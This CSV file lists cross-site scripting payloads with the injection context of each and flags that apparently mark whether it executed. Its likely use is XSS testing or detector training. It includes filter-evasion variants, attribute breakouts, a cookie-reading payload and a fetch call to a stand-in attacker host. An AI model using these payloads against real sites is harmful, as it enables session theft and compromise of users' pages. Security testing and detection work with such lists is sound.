payload,context,status,exec
"<script>alert(1)</script>	",html_tag,1,1
"<script>confirm(1)</script>		",html_tag,1,1
"<script>prompt(1)</script>		",html_tag,1,1
"<script>alert(document.cookie)</script>		",html_tag,1,1
"<script>fetch('http://attacker.com')</script>	",html_tag,1,1
"<img src=x onerror=alert(1)>		",html_tag,1,1
"<body onload=alert(1)>	",html_tag,1,1
"<svg onload=alert(1)>	",svg_context,1,1
"<input onfocus=alert(1) autofocus>	",html_tag,1,1
"<details open ontoggle=alert(1)>		",html_tag,1,1
"<ScRiPt>alert(1)</ScRiPt>	",html_tag,1,1
<script>alert(String.fromCharCode(49))</script>,html_tag,1,1
"<script>\u0061lert(1)</script>	",html_tag,1,1
"<scr<script>ipt>alert(1)</scr</script>ipt>		",html_text,1,0
""" onmouseover=""alert(1)",html_attribute,1,
' onerror='alert(1),html_attribute,1,
"""><script>alert(1)</script>",html_attribute,1,1
<svg onload=alert(1)>,svg_context,1,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,html_text,1,0
javascript:alert(1),url_href,,
"data:text/html,<script>alert(1)</script>",url_navigation,1,1
'><svg/onload=alert(1)>,html_attribute,1,1
"""><img src=x onerror=confirm(1)>",html_attribute,1,1
</script><script>alert(1)</script>,script_block,1,1
<script>alert(document.domain)</script>,html_tag,1,1
;alert(1);//,html_text,,0
""";alert(1);//",html_text,,0
`;alert(1);//,html_text,,0
;alert(1);//,script_block,,
""";alert(1);//",script_block,,
`;alert(1);//,script_block,,
%3Cscript%3Ealert(1)%3C%2Fscript%3E,html_tag,,
"<scr<script>ipt>alert(1)</scr</script>ipt>		",html_tag,,
